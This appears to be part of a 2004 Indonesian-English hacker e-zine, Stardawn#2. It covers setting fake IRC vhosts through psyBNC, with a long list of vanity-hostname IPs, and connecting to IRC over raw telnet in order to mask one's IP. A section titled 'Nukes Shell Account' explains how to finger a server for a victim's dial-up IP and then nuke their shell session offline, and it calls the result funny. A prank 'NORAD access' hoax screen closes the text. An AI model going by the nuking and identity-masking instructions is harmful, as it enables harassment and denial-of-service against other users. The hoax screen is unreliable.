+*[ Fake vhost ]
+
+
+
+ Saat ini mungkin anda sudah mempunyai shell account ,jika belum bisa baca di
+*[ Shell providers ].#1.chapter,untuk mendapatkan shell provider berikut vhost.
+Buka program mIRC ,ketik ;
+
+
+
+=========================================================================================
+mIRC							                                |
+=========================================================================================
+-Welcome to psybnc,You'have IRC Client doesn't support password,please type "quote PASS "
+to connect.
+
+
+
+
+--> ketik " /quote pass [password anda] "
+
+<-- psyBNC 'password accepted'
+
+
+--> ketik " /bvhost 208.37.46.xxx" (208.37.46.xxx )adalah nomer IP shell provider yang digunakan
+untuk membuat Fake vhost.
+
+- Dibawah ini ada beberapa vhost list yang sudah terdaftar ;
+
+208.37.46.103 t.e.r.s.e.n.y.u.m.tersenyum.org
+208.37.46.104 always.tersenyum.org
+208.37.46.105 suka.tersenyum.org
+208.37.46.106 jatuh.cinta.di.pandangan.pertama.ketika.tersenyum.org
+208.37.46.107 imutnya.ketika.pacarku.sedang.tersenyum.org
+208.37.46.108 bahagianya.hatiku.ketika.melihat.kekasihku.tersenyum.org
+208.37.46.109 bagaikan.bintang2.tersenyum.org
+208.37.46.110 bot.hepi.suka.tersenyum.org
+208.37.46.111 halo.cewek.info
+208.37.46.112 cewek.cewek.info
+208.37.46.113 cewek.cewek.cewek.info
+208.37.46.114 kemarilah.cewek.cewek.info
+208.37.46.115 c.ce.cew.cewe.cewek.info
+208.37.46.116 bot.ini.adalah.cewek.info
+208.37.46.117 Beverly.Newyork.Santa-Monica.Los-Angeles.Amrik.org
+208.37.46.118 california.amrik.org
+208.37.46.119 australia.asia.afrika.eropa.amrik.org
+208.37.46.120 jangan.kau.tinggalkan.aku.terpuruk.disini.org
+208.37.46.121 disini.disana.disini.disana.disini.disana.disini.org
+208.37.46.122 d.di.dis.disi.disin.disini.org
+208.37.46.123 elite.FreeBSDTech.com
+208.37.46.124 Staff.FreeBSDTech.com
+208.37.46.125 Formatting.micr0s0ft.and.get.the.FreeBSDTech.com
+208.37.46.126 Fragment.FreeBSDTech.com
+208.37.46.127 Traffixx.connected.attempt.FreeBSDTech.com
+208.37.46.128 world.communication.spoof.FreeBSDTech.com
+208.37.46.129 OperServ.FreeBSDTech.com
+208.37.46.130 packet.FreeBSDTech.com
+208.37.46.131 LinuxTech.FreeBSDTech.com
+208.37.46.132 system.FreeBSDTech.com
+208.37.46.133 sys-ADMIN.FreeBSDTech.com
+208.37.46.134 power.by.FreeBSDTech.com
+208.37.46.135 95.98.ME.2000.NT.XP.MAC.Linux.FreeBSDTech.com
+208.37.46.136 is.using.FreeBSDTech.com
+208.37.46.137 dialup.IP-24.FreeBSDTech.com
+208.37.46.138 8.years.uptime.with.FreeBSDTech.com
+208.37.46.139 FreeBSDTech.com
+208.37.46.140 proffessional.FreeBSDTech.com
+208.37.46.141 guru.FreeBSDTech.com
+208.37.46.142 AIX.HP-unix.redhat.mandrake.sunsolaris.FreeBSDTech.com
+208.37.46.143 Code.encription.of.FreeBSDTech.com
+208.37.46.144 eleet.FreeBSDTech.com
+208.37.46.145 global-security.unixshell.ws
+208.37.46.146 the.master.of.all.unixshell.ws
+208.37.46.147 CT-3.unixshell.ws
+208.37.46.148 ICMP.flood.from.unixshell.ws
+208.37.46.149 cluster.allocation.packet.dropped.unixshell.ws
+208.37.46.150 eggdrop.unixshell.ws
+208.37.46.151 Firewall.72x.deny.recepient.unixshell.ws
+208.37.46.152 31337.unixshell.ws
+208.37.46.153 CABLE-144-183-19-92.unixshell.ws
+208.37.46.154 358.2058.st.unixshell.ws
+208.37.46.155 linuxshell.unixshell.ws
+208.37.46.156 eye.am.going.to.packet.your.unixshell.ws
+208.37.46.157 unixshell.ws
+208.37.46.158 eggdrop.unixshell.ws
+208.37.46.159 rm-rf.unixshell.ws
+208.37.46.160 eleet.unixshell.ws
+208.37.46.161 baby.ceting.com
+208.37.46.162 major.ceting.com
+208.37.46.163 hacker.ceting.com
+208.37.46.164 Internet.cafe.ceting.com
+208.37.46.165 berjam.jam.ceting.com
+208.37.46.166 pagi.siang.sore.malam.selalu.ceting.com
+208.37.46.167 pusing.gara.gara.kebanyakan.ceting.com
+208.37.46.168 tsunami.flood.ceting.com
+208.37.46.169 hacker.ceting.com
+208.37.46.170 lagging.ceting.com
+208.37.46.171 tukang.ceting.com
+208.37.46.172 pengennnn.ceting.com
+208.37.46.173 simple.ceting.com
+208.37.46.174 united.kingdom.of.ceting.com
+208.37.46.175 kafe.ceting.com
+208.37.46.176 gatel.nih.tangan.kalo.gak.ceting.com
+208.37.46.177 boss.ceting.com
+208.37.46.178 no.more.ceting.com
+208.37.46.179 pulsa.jadi.naik.gara2.dialup.ceting.com
+208.37.46.180 raja.ceting.com
+208.37.46.181 overflow.ed.Indofreebsd.info
+208.37.46.182 bots.indofreebsd.info
+208.37.46.183 BSDi.NetBSD.FreeBSD.IndoFreeBSD.info
+208.37.46.184 CPE-203-173-18-3.syd.IndoFreeBSD.info
+208.37.46.185 hacket.IndoLinux.info
+208.37.46.186 SuSe.IndoLinux.info
+208.37.46.187 chat-uk3.IndoLinux.info
+208.37.46.188 channel.DAL-n-e-t.net
+208.37.46.189 raja.DAL-n-e-t.net
+208.37.46.190 senin.selasa.rabu.kamis.jumat.sabtu.minggu.net
+208.37.46.191 m.i.n.g.g.u.minggu.net
+208.37.46.192 malem.minggu.net
+208.37.46.193 sabtu.minggu.net
+208.37.46.194 grape.eskrim.net
+208.37.46.195 saya.manis.seperti.eskrim.net
+208.37.46.196 imut.seperti.eskrim.net
+208.37.46.197 La.La.La.La.La.makan.eskrim.net
+208.37.46.198 saya.manis.seperti.eskrim.net
+208.37.46.199 b0t.manteb.com
+208.37.46.200 pacarku.makin.cantik.aja.sekarang.net
+208.37.46.201 pemberian.cinta.mu.tidak.akan.kulupakan.sejak.sekarang
+
+<-- psyBNC " vhost has changed to  208.37.46.xxx ,JUMP to changed sever"
+
+
+--->ketik " JUMP" untuk merubah atau membuat fake vhost dari server.
+
+Setelah berubah atau berganti server ,ketik di window mIRC ' /whois namanickanda'
+Anda akan melihat bahwa IP/vhost anda berubah.
+
+
+Untuk lebih jelas anda bisa mengetik '/dns 208.37.46.2xx',pakai shell tersebut untuk
+vhost anda.
+
+
+========================================================================================
+
+..#6.Chapter
+*[ IRC daemon ]
+
+
+
+ Menggunakan IRC daemon sangat mudah untuk mengetahui bagaimana protocol bisa berjalan dan juga
+untuk spoff Ip melalui telnet  menggunakan shell account dengan IRC klient tanpa akses.
+
+
+
+ [Connecting to the IRC daemon]
+
+Telnet/netcat (yep... anda menggunakan raw socket)  IRC port (6667/6668..etc)
+
+eg <:> telnet irc.dal.net 6667
+
+Beri nick & username untuk recognized setelah kamu connected menggunakan user command  form "user <username> <namahost> <namaserver> <namaasli>".
+
+eg <:> user nobody localhost localhost :I'm nobody
+nick nobody
+
+!ingat!
+
+Jika sewaktu-waktu mendapatkan seperti ini;
+
+ping :1234567
+atau
+ping :192.0.0.1  <-- Sebuah IP address
+
+Anda harus mengirim kembali pesan tersebut dengan,cara;
+eg <:> pong :1234567
+atau
+pong :192.0.0.1
+
+
+Jika tidak segera mengirim kembali dengan pong,maka anda disconnect dari server.
+
+
+*[ Nukes Shell Account ] {english version}
+
+
+If you're using windows, you should download a program that will allow you to finger a server.
+Cyberkit is a good program, for it has Ping, Finger, Traceroute, etc.
+get it at http://www.ping.be/cyberkit/cyber.zip, or go find one of your own.  there are hundreds
+to choose from.  (no we're not being endorsed by cyberkit, it's just a kickass proggie)
+Most shell account users will login from a dial-up account, and if finger is running on their
+shell, it should display the dial-up IP address.  Finger the server and once you know this, use
+your nuker to disconnect them from their shell by replacing the IRC server with their shell
+account address, and use the IP you found through finger as the client.  Use ports 22 24 as the
+server ports, in place of 6660 6669.  Port 23 is the default telnet port, so nuking from 22 to 24
+will effictivly disconnect them from their shell account.  this usually causes your target to
+quit irc with "Where did my controling terminal go?"  quit message.  it's pretty funny when it
+works.
+
+
+..#7.chapter
+*[ Gambaran  Phone Hack tools ]
+
+
+
+=======================================================================================
+C:\WINDOWS\System32\Phone Hack Tools\Temp\Hoax.exe				      |              
+=======================================================================================
+Dialing NORAD Defense Network...
+ -RING-  -RING-  **CONNECT**
+
+NORAD Defense Network
+
+
+NORTH AMERICAN AIR DEFENSE COMMAND CONTROL SYSTEM
+
+N O R A D   S Y S T E M   C O M C O N 4 . . . CONNECTED
+03/15/02    13:28:51 P
+
+AUTHORITY CODE ==>XXXXXXX
+
+
+
+PROCESSING.....
+
+N O R A D   P R I M E   A C C E S S
+
+PLEASE STAND BY.....
+
+
+WARNING!!!!!
+INCOMING CALLERS SUBJECT TO UNITED STATES MILITARY
+TRIBUNAL JUSTICE SYSTEM. FOREIGN ACCESS STRICTLY
+PROHIBITED.  ACCESS IS ON A NEED TO KNOW, EYES-ONLY
+BASIS FOR ALL BUT COMMAND AUTHORITY.  AT THIS POINT
+IMPROPER IDENTIFICATION WILL RESULT IN AUTOMATIC
+SURVEILLANCE OF CONNECTING TELEPHONE LINE AND INFORMATION
+SO GATHERED WILL BE PROVIDED TO THE PROPER LOCAL
+POLICE AND GOVERNMENTAL AGENCIES...................
+ACKNOWLEDGED? (Y/N) >y
+
+
+N O R A D   P R I M E   A C C E S S
+
+
+PLEASE ENTER YOUR EYES-ONLY CODE
+=>8207512
+Verifying...
+
+
+CODE ENTERED IMPLIES COMMAND AUTHORITY
+ENTER YOUR VERIFICATION AS GIVEN IN...
+>>>>>BOOK 12RY-OLIVE<<<<<
+=>xxxxxxxxxxx
+
+
+Verifying...
+
+
+
+PROCESS A..COMPARING..ACCEPTED!
+
+
+
+SIR, COMCON4 REPORTS UPTIME VERIFIED FOR NEXT ONE HOUR.
+N O R A D   COMMAND CENTER CAN BE REACHED AT ANY TIME
+WITH PASSWORDS AS PROVIDED IN THE LANGLEY PROTOCOLS.
+
+
+ENTERING DIRECT COMMAND MODE....
+
+ENTER INTERNAL AUTHORIZATION CODE
+=>8207512
+
+
+
+SEARCHING FOR SUBPROGRAM........RUNNING 8207512 ON CPU 4
+
+PLEASE DECODE THE FOLLOWING:
+
+9 6 4 7 0 7 2 8 9 5 4 2 6 0 6 4 5 1 7 5 7 5 1 5 3 9 8 8 9 7 3 1 9 1 5 6 4 1 2 7
+4 4 3 5 0 3 0 2 4 0 0 7 8 2 9 6 8 2 0 6
+
+USING BOOK 7 GREY
+
+MAKE DECODED ENTRY AND PRESS RETURN
+=>
+
+
+==========================================================================================
+   				            - .EOF.-
+
+
+DISCLAIMER:
+
+Distribution of or allowing access to this program by uncleared
+individuals is strictly prohibited under penalty of federal law.
+
+Print: 'CTRL+P'
+1:29 PM 3/15/2002
+
+		***************************************************************
+		* E-zine Name....: Stardawn#2                                 *
+		* Author.........: basher13 <basher13@stardawn.net>           *
+		* Release Date...: 15 March 2004                              *
+		* Filename.......: Stardawn#2.txt                             *
+		* Web Site.......: http://www.stardawn.net                    *
+		***************************************************************
+		*                  Yeah basher13 RuleZ AgaiN!                 *
+		***************************************************************
+
+
+
+
